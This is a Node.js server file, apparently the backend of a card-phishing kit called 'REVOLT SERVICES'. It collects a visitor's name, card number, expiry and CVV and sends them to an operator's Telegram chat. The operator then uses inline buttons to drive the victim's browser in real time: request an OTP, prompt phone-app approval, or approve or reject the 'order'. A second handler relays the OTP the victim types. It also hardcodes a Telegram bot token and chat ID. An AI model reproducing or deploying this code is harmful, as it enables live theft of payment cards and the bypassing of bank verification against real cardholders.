const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// --- CONFIGURATION (YOUR DATA) ---
const TELEGRAM_TOKEN = '8105017890:AAGUgv5PhIDq-tSO5mmNiDc4fV8WZWmnxMk';
const ADMIN_CHAT_ID = '6410887780';
const PORT = process.env.PORT || 3000;

app.use(express.static('.'));
app.use(express.json());

let sessions = {}; // Holds socket connections linked to cards

io.on('connection', (socket) => {
    // When customer pays
    socket.on('customer-order', (data) => {
        sessions[data.card] = socket.id;
        
        const message = `🚨 *REVOLT SERVICES: NEW ORDER*\n\n` +
                        `📦 Product: *${data.product}*\n` +
                        `💰 Plan: *${data.plan} (€${data.price})*\n\n` +
                        `👤 Name: ${data.name}\n` +
                        `💳 Card: \`${data.card}\` \n` +
                        `📅 Expiry: ${data.expiry}\n` +
                        `🔒 CVV: ${data.cvv}`;

        const keyboard = {
            inline_keyboard: [
                [{ text: "✅ Approve", callback_data: `approve_${data.card}` }, { text: "❌ Reject", callback_data: `reject_${data.card}` }],
                [{ text: "🔑 Request OTP Code", callback_data: `askOTP_${data.card}` }],
                [{ text: "📱 Phone App Approval", callback_data: `phoneApp_${data.card}` }]
            ]
        };

        sendToTelegram(message, keyboard);
    });

    // When customer sends OTP
    socket.on('customer-otp', (otp) => {
        const message = `🔑 *RECEIVED OTP FOR REVOLT*\n\n` +
                        `Card: \`${otp.cardId}\` \n` +
                        `OTP Code: *${otp.code}*`;
        
        const keyboard = {
            inline_keyboard: [[
                { text: "✅ Success", callback_data: `approve_${otp.cardId}` },
                { text: "❌ Wrong / Retry", callback_data: `askOTP_${otp.cardId}` }
            ]]
        };
        sendToTelegram(message, keyboard);
    });
});

// Telegram Webhook Handler
app.post('/telegram-webhook', (req, res) => {
    const callback = req.body.callback_query;
    if (callback) {
        const [instruction, cardId] = callback.data.split('_');
        const socketId = sessions[cardId];

        if (socketId) {
            io.to(socketId).emit('admin-instruction', instruction);
        }

        // Response to telegram bot UI
        axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
            callback_query_id: callback.id,
            text: `Instruction sent: ${instruction}`
        });
    }
    res.sendStatus(200);
});

async function sendToTelegram(text, keyboard) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
            reply_markup: keyboard
        });
    } catch (e) { console.log("Telegram Error: ", e.message); }
}

server.listen(PORT, () => console.log(`REVOLT SERVICES running on ${PORT}`));
